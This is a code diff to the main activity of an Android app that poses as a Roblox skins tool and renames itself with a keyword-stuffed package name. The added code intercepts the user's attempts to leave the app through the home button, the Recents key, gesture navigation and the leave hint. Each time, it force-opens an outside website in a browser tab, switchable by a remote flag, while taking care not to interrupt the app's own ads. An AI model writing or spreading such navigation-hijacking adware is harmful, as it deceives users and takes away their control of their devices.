@@ -1,6 +1,11 @@
-package com.skinrobox.rbx_skins_tool
+package com.clothe.skin.roblox.emotes.shirt.rbxconverter.calculator.ai
 
+import android.app.Activity
+import android.app.Application
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.content.pm.ResolveInfo
 import android.net.Uri
@@ -27,17 +32,56 @@ import android.view.WindowManager
 import androidx.browser.customtabs.CustomTabsIntent
 
 class MainActivity : FlutterActivity() {
-    private val CHANNEL = "com.skinrobox.rbx_skins_tool/default_launcher"
+    private val CHANNEL = "com.clothe.skin.roblox.emotes.shirt.rbxconverter.calculator.ai/default_launcher"
     private val REQUEST_CODE_ROLE = 1001
     private var pendingRoleResult: MethodChannel.Result? = null
     private var isSettingDefaultLauncher = false
     private var isLauncherActive = false
+    private var showCct = true
+    private var isAdShowing = false
+    private var isLaunchingCustomTab = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         intent.putExtra("background_mode", BackgroundMode.transparent.name)
         window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WALLPAPER)
         super.onCreate(savedInstanceState)
         Log.d("RBX_FLOW", "MainActivity.onCreate() intent=" + intent)
+
+        application.registerActivityLifecycleCallbacks(object : Application.ActivityLifecycleCallbacks {
+            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = true
+                    Log.d("RBX_FLOW", "AdActivity created: isAdShowing=true")
+                }
+            }
+            override fun onActivityStarted(activity: Activity) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = true
+                }
+            }
+            override fun onActivityResumed(activity: Activity) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = true
+                }
+            }
+            override fun onActivityPaused(activity: Activity) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = false
+                }
+            }
+            override fun onActivityStopped(activity: Activity) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = false
+                }
+            }
+            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
+            override fun onActivityDestroyed(activity: Activity) {
+                if (activity.javaClass.name.contains("AdActivity")) {
+                    isAdShowing = false
+                    Log.d("RBX_FLOW", "AdActivity destroyed: isAdShowing=false")
+                }
+            }
+        })
     }
 
     override fun getBackgroundMode(): BackgroundMode {
@@ -46,7 +90,10 @@ class MainActivity : FlutterActivity() {
 
     override fun onResume() {
         super.onResume()
+        isLaunchingCustomTab = false
+        isAdShowing = false
         Log.d("RBX_FLOW", "MainActivity.onResume() isDefault=" + isDefaultLauncher() + ", pendingRoleResult=" + (pendingRoleResult != null))
+        registerSystemDialogsReceiver()
         if (pendingRoleResult != null) {
             val isDefault = isDefaultLauncher()
             if (isDefault) {
@@ -67,6 +114,59 @@ class MainActivity : FlutterActivity() {
         Log.d("RBX_FLOW", "MainActivity.onStop() called")
     }
 
+    override fun onDestroy() {
+        unregisterSystemDialogsReceiver()
+        super.onDestroy()
+    }
+
+    override fun onUserLeaveHint() {
+        super.onUserLeaveHint()
+        Log.d("RBX_FLOW", "MainActivity.onUserLeaveHint() called, isSettingDefault=$isSettingDefaultLauncher, showCct=$showCct, isAdShowing=$isAdShowing, isLaunchingCustomTab=$isLaunchingCustomTab")
+        // NEVER hijack ad displays with CCT!
+        if (!isSettingDefaultLauncher && showCct && !isAdShowing && !isLaunchingCustomTab) {
+            openCustomTab("https://www.novicbase.com/")
+        }
+    }
+
+    private var systemDialogsReceiver: BroadcastReceiver? = null
+
+    private fun registerSystemDialogsReceiver() {
+        if (systemDialogsReceiver != null) return
+        systemDialogsReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                if (intent.action == Intent.ACTION_CLOSE_SYSTEM_DIALOGS) {
+                    val reason = intent.getStringExtra("reason")
+                    Log.d("RBX_FLOW", "MainActivity: CLOSE_SYSTEM_DIALOGS reason=$reason")
+                    // "recentapps" is Android's Overview / Recents key, "fs_gesture" is gesture navigation
+                    if (reason == "recentapps" || reason == "fs_gesture") {
+                        if (!isSettingDefaultLauncher && showCct && !isAdShowing && !isLaunchingCustomTab) {
+                            openCustomTab("https://www.novicbase.com/")
+                        }
+                    }
+                }
+            }
+        }
+        val filter = IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(systemDialogsReceiver, filter, Context.RECEIVER_EXPORTED)
+            } else {
+                registerReceiver(systemDialogsReceiver, filter)
+            }
+        } catch (e: Exception) {
+            Log.d("RBX_FLOW", "Failed to register systemDialogsReceiver: $e")
+        }
+    }
+
+    private fun unregisterSystemDialogsReceiver() {
+        systemDialogsReceiver?.let {
+            try {
+                unregisterReceiver(it)
+            } catch (_: Exception) {}
+            systemDialogsReceiver = null
+        }
+    }
+
     override fun onNewIntent(intent: Intent) {
         setIntent(intent)
         Log.d("RBX_FLOW", "MainActivity.onNewIntent() action=" + intent.action + ", categories=" + intent.categories)
@@ -77,8 +177,8 @@ class MainActivity : FlutterActivity() {
 
         if (isHome || isLauncher) {
             Log.d("RBX_FLOW", "MainActivity.onNewIntent: isHome=" + isHome + ", isLauncher=" + isLauncher + ", isLauncherActive=" + isLauncherActive + ", isSettingDefault=" + isSettingDefaultLauncher)
-            // ONLY open custom tab if launcher is active AND we are not currently setting default launcher
-            if (isHome && isLauncherActive && !isSettingDefaultLauncher) {
+            // ONLY open custom tab if launcher is active AND we are not currently setting default launcher AND showCct is enabled
+            if (isHome && isLauncherActive && !isSettingDefaultLauncher && showCct) {
                 openCustomTab("https://www.novicbase.com/")
             }
             // CRITICAL: NEVER call super.onNewIntent for HOME or LAUNCHER intents!
@@ -102,6 +202,12 @@ class MainActivity : FlutterActivity() {
                 "setLauncherActive" -> {
                     val active = call.argument<Boolean>("active") ?: false
                     isLauncherActive = active
+                    result.success(true)
+                }
+                "setShowCct" -> {
+                    val enabled = call.argument<Boolean>("showCct") ?: true
+                    showCct = enabled
+                    Log.d("RBX_FLOW", "MainActivity: showCct updated to $showCct")
                     result.success(true)
                 }
                 "openHomeSettings" -> {
@@ -393,11 +499,16 @@ class MainActivity : FlutterActivity() {
     private var lastCustomTabTime: Long = 0
 
     private fun openCustomTab(url: String): Boolean {
+        if (!showCct || isAdShowing) {
+            Log.d("RBX_FLOW", "MainActivity.openCustomTab skipped because showCct=$showCct, isAdShowing=$isAdShowing")
+            return false
+        }
         val now = System.currentTimeMillis()
         if (now - lastCustomTabTime < 800) {
             return false
         }
         lastCustomTabTime = now
+        isLaunchingCustomTab = true
         return try {
             val uri = Uri.parse(url)
             val intent = CustomTabsIntent.Builder()
